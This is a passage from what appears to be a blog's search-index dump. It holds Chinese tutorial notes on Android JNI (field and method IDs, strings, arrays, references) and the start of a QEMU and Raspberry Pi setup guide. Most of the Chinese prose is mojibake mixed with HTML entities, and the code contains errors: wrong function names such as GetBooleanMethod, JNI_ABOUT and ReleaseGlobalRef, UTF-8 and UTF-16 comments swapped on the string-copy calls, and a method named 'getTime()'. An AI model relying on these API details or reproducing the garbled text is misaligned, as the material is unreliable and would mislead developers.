env-\u0026gt;GetFieldID(helloclazz,\u0026#34;property\u0026#34;,\u0026#34;I\u0026#34;); //å–åˆ°propertyå­—æ®µ jmethodID method_fun = env-\u0026gt;GetMethodID(helloclazz,\u0026#34;function\u0026#34;,\u0026#34;ILjava/util/Date;[I)I\u0026#34;); //å–åˆ°functionå‡½æ•° env-\u0026gt;CallIntMethod(instance,method_fun,0L,NULL,NULL); } GetStaticFieldIDä¸GetStaticMethodIDè¿™ä¸¤ä¸ªæ–¹æ³•çš„ç”¨æ³•å¤§åŒå°å¼‚ã€‚\n2.3 JNIEnvç±»å‹ä¸­æ–¹æ³•çš„ä½¿ç”¨ åœ¨javaä¸­å®šä¹‰ä¸€ä¸ªå±æ€§ï¼Œå†ä»C++ä»£ç ä¸­å°†å…¶è®¾ç½®æˆå¦å¤–çš„å€¼ 2.3.1 nativeä¸­è·å–æ–¹æ³•çš„ID 1 2 3 4 5 6 7 8 9 10 11 private static String TAG = \u0026#34;Hello\u0026#34;; public int number = 0; public native void sayHello(); public static void main() { Hello hello = new Hello(); hello.sayHello(); System.out.print(hello.number); Log.d(TAG, \u0026#34;\u0026#34;+hello.number); } } 1 2 3 4 5 6 7 8 9 10 JNIEXPORT void JNICALL Java_com_naivete_jni_1study_Hello_sayHello(JNIEnv *env, jobject instance) { // TODO jclass helloclazz = env-\u0026gt;GetObjectClass(instance); jfieldID id_number = env-\u0026gt;GetFieldID(helloclazz,\u0026#34;number\u0026#34;,\u0026#34;I\u0026#34;); //è·å–numberID jint number = env-\u0026gt;GetIntField(instance,id_number); //è·å–numberçš„å€¼; cout\u0026lt;\u0026lt;number\u0026lt;\u0026lt;endl; //è¾“å‡ºåˆ°æ§åˆ¶å° env-\u0026gt;SetIntField(instance,id_number,100L); //è®¾ç½®numberçš„å€¼;æ³¨æ„jintå¯¹åº”c++ longç±»å‹ } JNIEnv è¿˜æä¾›äº†è®¸å¤šCallMethod å’ŒCallStaticMethod è¿˜æœ‰CallNovirtualMethodå‡½æ•°ï¼Œéœ€è¦é€šè¿‡GetMethodIDæ¥å–å¾—ç›¸åº”çš„æ–¹æ³•çš„jmethodIdä¼ å…¥åˆ°ä¸Šè¿°å‡½æ•°çš„å‚æ•°ä¸­\nè°ƒç”¨ç¤ºä¾‹æ–¹æ³•çš„ä¸‰ç§å½¢å¼å¦‚ä¸‹ï¼š\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,Â·Â·Â·Â·Â·Â·Â·); //å¸¸ç”¨çš„æ–¹å¼\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,va_list lst); //æœ‰æŒ‡å‘å‚æ•°è¡¨çš„va_listå˜é‡ï¼ˆå¾ˆå°‘ä½¿ç”¨ï¼‰\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,jvalue * v); //æœ‰æŒ‡å‘jvalueæˆ–jvalueæ•°ç»„æŒ‡é’ˆæ—¶ç”¨çš„\njvalue æ˜¯unionè”åˆä½“ï¼Œå®šä¹‰jvalueæ•°ç»„ä¼ é€’åˆ°æ–¹æ³•ä¸­ï¼Œè¿™æ ·å¯ä»¥åŒ…å«å¤šç§ç±»å‹çš„å‚æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 typedef union jvalue{ jboolean z; jbytpe b; jchar c; jshort s; jint i; jlong j; jfloat f; jdouble d; jobject l; }jvalue; æ¯”å¦‚åœ¨Javaä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ–¹æ³•ï¼š\n1 2 3 4 5 boolean function(int a,double b,char c){ Â·Â·Â·Â·Â· } 1ï¼‰åœ¨C++ä¸­ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•è°ƒç”¨functionæ–¹æ³•ï¼š\nenv-\u0026gt;CallbooleanMethod(obj,id_function,10Lï¼Œ3.4ï¼ŒL'a')\nobj:functonå¯¹è±¡ï¼Œid_function:functiondçš„id,10Lã€3.4ã€Lâ€™aâ€™æ˜¯å¯¹åº”çš„å‚æ•°ã€‚\nLâ€™aâ€™ ä¸­çš„Læ˜¯å› ä¸ºJavaä¸­çš„å­—ç¬¦æ˜¯UnicodeåŒå­—èŠ‚çš„ï¼Œè€ŒC++ä¸­çš„å­—èŠ‚æ˜¯å•å­—èŠ‚çš„ï¼Œæ‰€ä»¥è¦å˜æˆå®½å­—ç¬¦ã€‚\n2ï¼‰åœ¨C++ä¸­ä½¿ç”¨ç¬¬ä¸‰ç§æ–¹æ³•functionè°ƒç”¨ï¼š\n1 2 3 4 5 6 jvalue* args = new Jvalue[3] args[0] = 10L; args[1] = 3.22; args[2] = L\u0026#39;a\u0026#39;; env-\u0026gt;GetBooleanMethod(obj,id_function,args); delete[] args; //æ˜¯å¦æŒ‡é’ˆå †å†…å­˜ 2.3.2 Javaå’ŒC++ä¸­çš„å¤šæ€æœºåˆ¶ JNIEnvä¸­çš„ç‰¹æ®Šæ–¹æ³•CallNovirtualMethodã€‚æ¥å¸®åŠ©javaè°ƒç”¨Javaä¸­çˆ¶ç±»çš„æ–¹æ³•ã€‚\nä»‹ç»äº†-C++å’Œjavaå¤šæ€çš„åŸºç¡€çŸ¥è¯†ã€‚\næ­¥éª¤ï¼š\nè·å–objä¸­å¯¹è±¡çš„class å¯¹è±¡ GetObjectClass(obj)\nè·å–javaä¸­fatherå­—æ®µçš„id GetFieldID()\nè·å–fatherå­—æ®µçš„å¯¹è±¡ç±»å‹ GetObjectField\nè·å–fatherå¯¹è±¡çš„classå¯¹è±¡ FindClass\nè·å–fatherå¯¹è±¡ä¸­functionæ–¹æ³•ID GetMethodID()\nè°ƒç”¨çˆ¶ç±»ä¸­çš„functionæ–¹æ³•ï¼ˆä¼šæ‰§è¡Œå­ç±»çš„æ–¹æ³•ï¼‰CallvoidMethod\nè°ƒç”¨çˆ¶ç±»ä¸­çš„functionæ–¹æ³•ï¼ˆä¼šæ‰§è¡Œçˆ¶ç±»çš„æ–¹æ³•ï¼‰CallNonvirtualVoidMethod()\n2.4 åˆ›å»ºJavaå¯¹è±¡åŠå­—ç¬¦ä¸²çš„æ“ä½œæ–¹æ³• 2.4.1 nativeä¸­åˆ›å»ºJavaå¯¹è±¡ â€‹ ä¸¤ç§æ–¹æ³•ï¼š\nç¬¬ä¸€ç§ï¼š\njobject Newobject(jclass clazz,jmethodID methodID,Â·Â·Â·Â·Â·)\nclazz éœ€è¦åˆ›å»ºçš„Javaå¯¹è±¡çš„Classå¯¹è±¡ã€‚\nmethodID :ä¼ é€’ä¸€ä¸ªæ–¹æ³•çš„ID: æ„é€ æ–¹æ³•\nç¬¬ä¸‰ä¸ªå‚æ•°ï¼šæ„é€ å‡½æ•°éœ€è¦ä¼ å…¥çš„å‚æ•°å€¼ï¼ˆé»˜è®¤ä¸ä¼ é€’ï¼‰ é»˜è®¤æ„é€ æ–¹æ³•è¿”å›å€¼ç­¾åå§‹ç»ˆæ˜¯â€œ()Vâ€,æ–¹æ³•çš„åç§°å§‹ç»ˆæ˜¯â€œ\nâ€ã€‚\nåœ¨C++ä¸­æ„é€ Javaä¸­çš„Dateå¯¹è±¡è°ƒç”¨æ–¹æ³•getTime():\n1 2 3 4 5 6 jclass clazz_date = env-\u0026gt;FindClass(\u0026#34;java/util/Date\u0026#34;); //è·å–dateå¯¹è±¡ jmethodID mid_date = env-\u0026gt;GetMethodID(clazz_date,\u0026#34;\u0026lt;init\u0026gt;\u0026#34;,\u0026#34;()V\u0026#34;); //è·å–æ„é€ æ–¹æ³•çš„ID jobject now = env-\u0026gt;NewObject(clazz_date,mid_date); //ç”ŸæˆDateå¯¹è±¡ jmethodID mid_date_getTime = env-\u0026gt;GetMethodID(clazz_date,\u0026#34;getTime()\u0026#34;,\u0026#34;()J\u0026#34;); //è·å–getTimeçš„ID jlong time = env-\u0026gt;CallLongMethod(now,mid_date_getTime);//è°ƒç”¨getTimeè¿”å›æ—¶é—´ printf(\u0026#34;%I64d\u0026#34;,time); ç¬¬äºŒç§ï¼š\nç”¨AllocObjectå‡½æ•°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥æ ¹æ®ä¼ å…¥çš„jclassåˆ›å»ºä¸€ä¸ªjavaå¯¹è±¡ï¼Œä½†æ˜¯çŠ¶æ€æ—¶æœªåˆå§‹åŒ–çš„ï¼Œåœ¨è¿™ä¸ªå¯¹è±¡ä¹‹å‰ç»å¯¹è¦ç”¨CallNonvirtualVoidMethodæ¥è°ƒç”¨è¯¥jclassçš„æ„é€ å‡½æ•°è¿™æ ·å¯ä»¥å»¶è¿Ÿæ„é€ å‡½æ•°çš„è°ƒç”¨ã€‚ç”¨çš„æ¯”è¾ƒå°‘ã€‚\negï¼šç•¥ï¼›\n2.4.2 nativeä¸­æ“ä½œJavaå­—ç¬¦ä¸² â€‹ Java-Stringå¯¹è±¡æ˜¯Unicode(UTF-16)ç  ä¸€ä¸ªå­—ç¬¦æ€»æ˜¯å ç”¨ä¸¤ä¸ªå­—èŠ‚ å¯ä»¥é€šè¿‡JNIæ¥å£å°†Javaä¸­çš„å­—ç¬¦ä¸²è½¬æ¢åˆ°C++çš„å®½å­—ç¬¦ä¸²ï¼ˆwchar_t*),æˆ–è€…ä¼ å›ä¸€ä¸ªUTF-8ç¼–ç çš„å­—ç¬¦ä¸²ï¼ˆchar * )åˆ°C++ åè¿‡æ¥åŒç†ã€‚\nJNIEnvä¸­çš„ä¸€äº›C++æ–¹æ³•ï¼š\n1ï¼‰è·å–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼š\nâ€‹ jsize GetStringLength(jstring j_msg)\nå°†jstring å¯¹è±¡æ‹·è´åˆ°const jchar* æŒ‡é’ˆå­—ç¬¦ä¸²ï¼š â€‹ //æ‹·è´Javaå­—ç¬¦ä¸²å¹¶ä»¥UTF-8ç¼–ç ä¼ å…¥jstr:\nâ€‹ env-\u0026gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);\nâ€‹ ////æ‹·è´Javaå­—ç¬¦ä¸²å¹¶ä»¥UTF-16ç¼–ç ä¼ å…¥jstr:\nâ€‹ env-\u0026gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);\nç”Ÿæˆä¸€ä¸ªjstring å¯¹è±¡ â€‹ jobject NewString(const jchar* jstr,int size);\nâ€‹ å°†å­—ç¬¦ä¸²æŒ‡é’ˆjstrè½¬æ¢æˆjstringã€‚\nå°†jstringå¯¹è±¡è½¬æ¢æˆconst jchar* å­—ç¬¦ä¸²æŒ‡ã€‚ GetStringChars å¼€å†…å­˜ æŒ‡é’ˆæŒ‡å‘å…ˆå¼€çš„å†…å­˜\nconst* jchar * GetStringChars(jstring j_msg,jboolean* copied)\nè¿”å›ä¸€ä¸ªUTF-16ç¼–ç çš„å®½å­—ç¬¦ä¸²ï¼ˆjchar*);\nå¯¹åº”çš„é‡Šæ”¾å†…å­˜æ–¹æ³•ï¼š\nReleaseStringChars(jstring j_msg,const jchar* jstr)\nGetStringUTFChars ä¸å¼€å†…å­˜ç›´æ¥æŒ‡å‘Javaä¸­stringçš„æŒ‡é’ˆ\nconst char* GetStringUTFChars(jstring str,jboolean* copied)\nå–å¾—UTF-8ç¼–ç çš„å­—ç¬¦ä¸²\né‡Šæ”¾ï¼š\nReleaseStringUTFChars(jstring j_msg,const jchar* jstr)\nå°†jstring å¯¹è±¡è½¬åŒ–æˆconst jchar* å­—ç¬¦ä¸²æŒ‡é’ˆï¼š â€‹ const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)\nâ€‹ ä½œç”¨:å¢åŠ ç›´æ¥ä¼ å›æŒ‡å‘Javaå­—ç¬¦ä¸²çš„æŒ‡é’ˆçš„å¯èƒ½æ€§ï¼ˆè€Œä¸æ˜¯æ‹·è´ï¼‰ï¼›\nâ€‹ åœ¨GetStringCritical/ReleaseStringCriticalä¹‹é—´çš„å…³é”®åŒºåŸŸä¹‹é—´ä¸èƒ½è°ƒç”¨ä»»ä½•å…¶ä»–JNIå‡½æ•°ã€‚å¦åˆ™ä¼šé€ æˆå…³é”®åŒºåŸŸä»£ç æ‰§è¡ŒæœŸé—´åƒåœ¾å›æ”¶å™¨åœæ­¢å·¥ä½œã€‚ä»»ä½•è§¦å‘åƒåœ¾å›æ”¶å™¨çš„çš„çº¿ç¨‹ä¹Ÿå°†æš‚åœã€‚\nâ€‹ é‡Šæ”¾ï¼š\nâ€‹ ReleaseStringCritical(jstring j_msg,const jchar* jstr)\nå®ä¾‹egï¼šï¼ˆä¸ä¹¦ä¸Šä¸åŒ,æ€è·¯å¤§æ¦‚ç›¸åŒï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class MainActivity extends AppCompatActivity { private EditText et; private TextView tv; private Button bt; public String text = null; // Used to load the \u0026#39;native-lib\u0026#39; library on application startup. static { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); et = findViewById(R.id.editText); tv = findViewById(R.id.tv); bt = findViewById(R.id.button); bt.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { text = et.getText().toString().trim(); callCppFunction(); tv.setText(text); } }); } public native void callCppFunction(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_example_naivete_jnidemo_MainActivity_callCppFunction(JNIEnv *env, jobject instance) { // TODO //è·å–text jfieldID fid_tx = env-\u0026gt;GetFieldID(env-\u0026gt;GetObjectClass(instance),\u0026#34;text\u0026#34;,\u0026#34;Ljava/lang/String;\u0026#34;); //è·å–extå¯¹è±¡ jstring j_tx = (jstring)env-\u0026gt;GetObjectField(instance,fid_tx); //ç¬¬ä¸€ç§æ–¹å¼ //è·å¾—å­—ç¬¦ä¸²æŒ‡é’ˆï¼š const jchar* jstr1 = env-\u0026gt;GetStringChars(j_tx,NULL); //zè½¬æ¢æˆå®½å­—ç¬¦ wstring wstr((const wchar_t*)jstr1); //é‡Šæ”¾æŒ‡é’ˆ env-\u0026gt;ReleaseStringChars(j_tx,jstr1); //ç¬¬ä¸€ç§END //ç¬¬äºŒç§ const jchar * jstr2 = env-\u0026gt;GetStringCritical(j_tx,NULL); wstring wstr2((const wchar_t*)jstr2); env-\u0026gt;ReleaseStringCritical(j_tx,jstr2); //END //ç¬¬ä¸‰ç§ jsize len = env-\u0026gt;GetStringLength(j_tx); //è·å–é•¿åº¦ jchar * jstr3 = new jchar[len+1]; jstr3[len]=L\u0026#39;\\0\u0026#39;; //å¤åˆ¶ env-\u0026gt;GetStringRegion(j_tx,0,len,jstr3); wstring wstr3((const wchar_t*)jstr3); delete[] jstr3; //End //å€’åº reverse(wstr.begin(),wstr.end()); jstring j_new_str = env-\u0026gt;NewString((const jchar*)wstr.c_str(),(jint)wstr.size()); env-\u0026gt;SetObjectField(instance,fid_tx,j_new_str); } â€‹\n2.5 C/C++ä¸­æ“ä½œJavaä¸­çš„æ•°ç»„ â€‹ åœ¨javaä¸­æ•°ç»„åˆ†ä¸ºä¸¤ç§ï¼š\nåŸºæœ¬ç±»å‹æ•°ç»„\nå¯¹è±¡ç±»å‹æ•°ç»„\nä¸€ä¸ªèƒ½ç”¨äºä¸¤ç§ä¸åŒç±»å‹æ•°ç»„çš„å‡½æ•°æ˜¯ï¼šGetArrayLength(jarray array)ã€‚\n2.5.1 æ“ä½œåŸºæœ¬ç±»å‹çš„æ•°ç»„ GetArrayElementsæ–¹æ³•Get\u0026lt;Type\u0026gt;ArrayElements(\u0026lt;Type\u0026gt;Array arr,jboolean* isCopide)\næŠŠJavaä¸­çš„åŸºæœ¬ç±»å‹çš„æ•°ç»„è½¬æ¢æˆC++ä¸­çš„æ•°ç»„ ä¸¤ç§æ–¹å¼ï¼š\nä¸€æ˜¯æ‹·è´ä¸€ä»½ä¼ å›æœ¬åœ°ï¼Œå¦å¤–ä¸€ç§æ˜¯æŠŠæŒ‡å‘Javaæ•°ç»„çš„æŒ‡é’ˆç›´æ¥ä¼ å›åˆ°æœ¬åœ°ä»£ç ä¸­\nå¤„ç†å®Œåï¼Œé€šè¿‡ReleaseArrayelements æ¥é‡Šæ”¾æ•°ç»„ã€‚\nReleaseArrayelement æ–¹æ³•Release\u0026lt;Type\u0026gt;Arrayelement(Type\u0026gt;Array arr,\u0026lt;Type\u0026gt;* array,jint mode)\nè¿™ä¸ªå‡½æ•°å¯ä»¥é€‰æ‹©å¦‚ä½•å¤„ç†Javaå’ŒC++ä¸­çš„æ•°ç»„ï¼Œæ˜¯æäº¤è¿˜æ˜¯æ’¤é”€Â·Â·Â·Â·å†…å­˜æ˜¯å¦é‡Šæ”¾ç­‰ç­‰ã€‚\nmodeçš„å–å€¼ï¼š\n0ï¼šå¯¹Javaçš„æ•°ç»„è¿›è¡Œæ›´æ–°å¹¶ä¸”é‡Šæ”¾C/C++æ•°ç»„\nJNI_COMMITï¼šæ›´æ–°ä½†æ˜¯ä¸é‡Šæ”¾\nJNI_ABOUTï¼šä¸æ›´æ–°ï¼Œé‡Šæ”¾ã€‚\nGetPrimittiveArrayCriticalæ–¹æ³•\nGetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)\nReleasePrimittiveArrayCriticalæ–¹æ³•\nReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)\nGetArrayRegionæ–¹æ³•Get\u0026lt;type\u0026gt;ArrayRegion(\u0026lt;Type\u0026gt;Arryay arr,jsize strat ,jsize len,\u0026lt;Type\u0026gt;* buffer)\nåœ¨C++ä¸­å¼€è¾Ÿå†…å­˜ï¼Œæ‹·è´æ•°ç»„åˆ°å†…å­˜ä¸­ã€‚\nSetArrayRegionSet\u0026lt;type\u0026gt;ArrayRegion(\u0026lt;Type\u0026gt;Arryay arr,jsize strat ,jsize len,const \u0026lt;Type\u0026gt;* buffer)\næŠŠJavaåŸºæœ¬ç±»å‹æ•°ç»„ä¸­çš„æŒ‡å®šèŒƒå›´çš„å…ƒç´ ç”¨C++æ•°ç»„ä¸­çš„å…ƒç´ æ¥èµ‹å€¼ã€‚\nArrayNewæ–¹æ³•\u0026lt;Type\u0026gt;ArrayNew\u0026lt;Type\u0026gt;Array(jszie sz)\næŒ‡å®šä¸€ä¸ªé•¿åº¦ç„¶åè¿”å›ç›¸åº”çš„JavaåŸºæœ¬ç±»å‹çš„æ•°ç»„ã€‚\n2.5.2 æ“ä½œå¯¹è±¡æ•°ç»„ç±»å‹ â€‹ JNIæœªæä¾›æŠŠJavaå¯¹è±¡æ•°ç»„ ç›´æ¥è½¬åˆ°C++å¯¹è±¡æ•°ç»„çš„å‡½æ•°ã€‚è€Œæ˜¯é€šè¿‡Get/SetObjectArrayaElementè¿™æ ·çš„å‡½æ•°æ¥å¯¹javaä¸­çš„å¯¹è±¡æ•°ç»„è¿›è¡Œæ“ä½œã€‚å› ä¸ºæœªæ‹·è´ æ‰€ä»¥æ²¡æœ‰é‡Šæ”¾æ“ä½œã€‚NewObjectArrayå¯ä»¥é€šè¿‡æŒ‡å®šé•¿åº¦å’Œåˆå§‹å€¼æ¥åˆ›å»ºæŸä¸€ä¸ªç±»çš„æ•°ç»„ã€‚\nä¾‹å­ï¼šä¸¤ç§ç±»å‹çš„æ“ä½œï¼š\nç•¥Â·Â·Â·Â·Â·\nâ€‹ æ³¨ï¼šä¹¦æœ¬P34-36\n2.6 C++/Cä¸­çš„å¼•ç”¨ç±»å‹å’ŒIDç¼“å­˜ 2.6.1 å¼•ç”¨ç±»å‹ â€‹ ä»Javaåˆ›å»ºå¯¹è±¡ä¼ åˆ°æœ¬åœ°C/C++ä»£ç æ—¶ä¼šäº§ç”Ÿå¼•ç”¨ï¼Œæ ¹æ®Javaçš„åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œåªè¦å­˜åœ¨å¼•ç”¨å°±ä¸ä¼šè§¦å‘æ”¹å¼•ç”¨æ‰€æŒ‡çš„Javaå¯¹è±¡åƒåœ¾å›æ”¶ã€‚\nâ€‹ å‡ ç§C/C++ä¸­çš„å¼•ç”¨ç±»å‹ï¼š\nå±€éƒ¨å¼•ç”¨ï¼šï¼ˆæœ€å¸¸è§ï¼‰\nå±€éƒ¨å¼•ç”¨åªåœ¨è¯¥nativeå‡½æ•°ä¸­æœ‰ç”¨ï¼Œæ‰€æœ‰åœ¨è¯¥å‡½æ•°ä¸­äº§ç”Ÿçš„å±€éƒ¨å¼•ç”¨ï¼Œéƒ½ä¼šåœ¨å‡½æ•°è¿”å›æ—¶è‡ªåŠ¨é‡Šæ”¾ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨DeleteLocalRefå‡½æ•°æ‰‹åŠ¨é‡Šæ”¾ã€‚\næœ‰æ•ˆæœŸä¸­èƒ½ä¼ é€’åˆ°åˆ«çš„æœ¬åœ°å‡½æ•°ä¸­ï¼Œåƒä¸‡ä¸è¦ç”¨C++å…¨å±€å˜é‡ä¿å­˜å®ƒï¼Œæˆ–è€…æŠŠå®ƒå®šä¹‰ä¸ºC++é™æ€å±€éƒ¨å˜é‡ã€‚\nå…¨å±€å¼•ç”¨ï¼š\nå¯ä»¥è·¨è¶Šå½“å‰çº¿ç¨‹ï¼Œåœ¨å¯¹ä¸ªnativeå‡½æ•°ä¸­æœ‰æ•ˆï¼Œéœ€è¦æ‰‹åŠ¨é‡Šæ”¾ã€‚ä¼šé˜»æ­¢åƒåœ¾å›æ”¶å™¨å›æ”¶è¿™ä¸ªå¼•ç”¨æ‰€æŒ‡çš„å¯¹è±¡ã€‚\nä¸åŒäºå±€éƒ¨å¼•ç”¨ï¼Œå…¨å±€å¼•ç”¨çš„åˆ›å»ºä¸æ˜¯ç”±JNIè‡ªåŠ¨åˆ›å»ºçš„ï¼Œå…¨å±€å¼•ç”¨æ˜¯éœ€è¦è°ƒç”¨NewGlobalRefå‡½æ•°ï¼Œé‡Šæ”¾ä½¿ç”¨ReleaseGlobalRefå‡½æ•°ã€‚\nå¼±å…¨å±€å¼•ç”¨\nä¸å…¨å±€å¼•ç”¨ç›¸ä¼¼ã€‚ä¸ä¸€æ ·çš„ä¸ºä¸ä¼šé˜»æ­¢åƒåœ¾å›æ”¶å™¨å›æ”¶è¿™ä¸ªå¼•ç”¨æ‰€æŒ‡å¯¹è±¡ï¼Œä½¿ç”¨NewWeakGlobalRefå’ŒReleaseWeakGlobalRefæ¥äº§ç”Ÿå’Œé‡Šæ”¾ã€‚\nå…³äºå¼•ç”¨çš„ä¸€äº›å‡½æ•°ï¼š\njobject NewGlobalRef(jobject obj)\njobject NewLocalRef(jobject obj)\njobject New WeakGlobalRef(jobject obj)\nvoid DeleteGlobalRef(jobject obj)\nvoid DeleteLocalRef(jobject obj)\nvoid DeleteWeakGlobalRef(jobject obj)\nå¾ˆå®¹æ˜“ç†è§£ä¸Šé¢6ä¸ªå‡½æ•°\njboolean IsSameObject(jobject obj1,jobject obj2)\nè¿™ä¸ªå‡½æ•°ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªå¼•ç”¨æ˜¯å¦ç›¸ç­‰ï¼Œä½†æ˜¯å¯¹äºå¼±å¼•ç”¨æœ‰ä¸€ä¸ªç‰¹åˆ«çš„åŠŸèƒ½ï¼Œå¦‚æœæŠŠNULLä¼ å…¥è¦æ¯”è¾ƒçš„å¯¹è±¡ä¸­å°±èƒ½åˆ¤æ–­å¼±å…¨å±€å¼•ç”¨æ‰€æŒ‡çš„Javaå¯¹è±¡æ˜¯å¦è¢«å›æ”¶ã€‚\nç¼“å­˜jfieldID/jmethodID.å‡å°æŸ¥è¯¢å¼€é”€ã€‚\n2.6.2 ç¼“å­˜æ–¹æ³• åœ¨ç”¨çš„æ—¶å€™ç¼“å­˜\nåœ¨nativeä»£ç ä¸­ä½¿ç”¨staticå±€éƒ¨å˜é‡æ¥ä¿å­˜å·²ç»æŸ¥è¯¢è¿‡çš„id,å°±ç¼“å­˜ä¸‹äº†idã€‚\nåœ¨Javaç±»åˆå§‹åŒ–æ—¶ç¼“å­˜\næ¯”è¾ƒå¥½çš„æ–¹æ³•ï¼Œåœ¨nativeè°ƒç”¨å‰æŠŠæ‰€æœ‰IDå…¨éƒ¨ä¿å­˜ä¸‹æ¥ã€‚å¯ä»¥è®©Javaä»£ç åœ¨ç¬¬ä¸€æ¬¡åŠ è½½è¿™ä¸ªç±»çš„æ—¶å€™é¦–å…ˆè°ƒç”¨æœ¬åœ°ä»£ç åˆå§‹åŒ–æ‰€æœ‰çš„jfildID/jmethodID.è¿™æ ·å¯ä»¥çœå»å¤šæ¬¡ç¡®å®šIDæ˜¯å¦å­˜åœ¨çš„è¯­å¥ã€‚è¿™äº›jfildID/jmethodIDå®šä¹‰åœ¨C++çš„å…¨å±€ã€‚å½“javaç±»å¸è½½æˆ–è€…é‡æ–°åŠ è½½çš„æ—¶å€™ï¼Œä¹Ÿä¼šé‡æ–°è®¡ç®—ID.\n1 2 3 4 5 6 7 8 9 10 public class TestNative{ static{ initNativeIDs(); //é™æ€ä»£ç å—è¿›è¡Œåˆå§‹åŒ– } static native void initNativeIDs(); int propInt = 0; String propStr = \u0026#34;\u0026#34;; public native void otherNative(); Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· } 1 2 3 4 5 6 7 8 9 10 jfieldID g_propInt_id = 0; jfieldID g_propStr_id = 0; JNIEXPORT void JNICALL Java_Â·Â·Â·Â·initï¼ˆJNIEnv* env,jobject clazzï¼‰{ jfieldID g_propInt_id = GetfieldID(clazz,\u0026#34;propInt\u0026#34;,\u0026#34;I\u0026#34;); jfieldID g_propStr_id = GetfieldID(clazz,\u0026#34;propStr\u0026#34;,\u0026#34;/Ljava/lang/String;\u0026#34;); } JNIEXPORT void JNICALL Java_Â·Â·Â·Â·otherï¼ˆJNIEnv* env,jobject clazzï¼‰{ Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· } æ€»ç»“ â€‹ ä¸»è¦æ˜¯NDKå¼€å‘ç›¸å…³ã€‚\nâ€‹ æ„Ÿè§‰ç³»ç»Ÿçš„å­¦äº†ä¸€éè¿˜æ˜¯æ„Ÿè§‰ä¸é”™çš„ã€‚\nå¯ä»¥å¤šæ‰¾ç½‘ä¸Šçš„ä¾‹å­æ¥ç»ƒä¹ ç»ƒä¹ ï¼ŒåŠ æ·±å¯¹JNI çš„äº†è§£ã€‚\n","date":"2018-08-16T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/","title":"Androidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ-åŸºç¡€ç¯‡2"},{"content":"QUMEçš„å®‰è£…ä½¿ç”¨(è¡¥å……) QEMUçš„å®‰è£…ä½¿ç”¨ å®‰è£… WIndowsï¼šhttps://qemu.weilnetz.de/w64/ ä¸‹è½½exeå®‰è£…å°±è¡Œ\nMACOS:brew install qemu or sudo port install qemu\nLINUXï¼š\nArch: pacman -S qemu\nDebian/Ubuntu: apt-get install qemu\nFedora: dnf install @virtualization\nGentoo: emerge --ask app-emulation/qemu\nRHEL/CentOS: yum install qemu-kvm\nSUSE: zypper install qemu\næºç å®‰è£…ï¼šhttps://download.qemu.org/\nwget\n1 2 3 4 5 wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz tar xvJf qemu-3.0.0-rc1.tar.xz cd qemu-3.0.0-rc1 ./configure make git\n1 2 3 4 5 6 git clone git://git.qemu.org/qemu.git cd qemu git submodule init git submodule update --recursive ./configure make æœ€æ–°çš„å¼€å‘å‘ç”Ÿåœ¨ä¸»åˆ†æ”¯ä¸Šã€‚ç¨³å®šçš„æ ‘ä½äºåä¸ºâ€œç¨³å®šxâ€çš„åˆ†æ”¯ä¸­ã€‚YYåˆ†æ”¯,Xã€‚YYæ˜¯å‘å¸ƒç‰ˆæœ¬ã€‚\næ ‘è“æ´¾å†…æ ¸åˆ¶ä½œï¼ˆåœ¨windowsä¸Š) ä¸‹è½½æ ‘è“æ´¾ç³»ç»Ÿï¼šhttp://downloads.raspberrypi.org/raspbian/images/\nä¸‹è½½qume çš„æ ‘è“æ´¾å†…æ ¸ï¼šÂ https://github.com/dhruvvyas90/qemu-rpi-kernel æ”¹åä¸ºkernel-qemuæ”¾åœ¨å’Œç³»ç»Ÿé•œåƒåŒç›®å½•ä¸‹\næ”¾åœ¨äº†raspbiaç›®å½•ä¸‹\nqemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append \u0026quot;root=/dev/sda2 panic=1rootfstype=ext4 rw\u0026quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img\næ³¨æ„è‡ªå·±ä¸‹è½½çš„é•œåƒç‰ˆæœ¬\nLinuxä¸Š 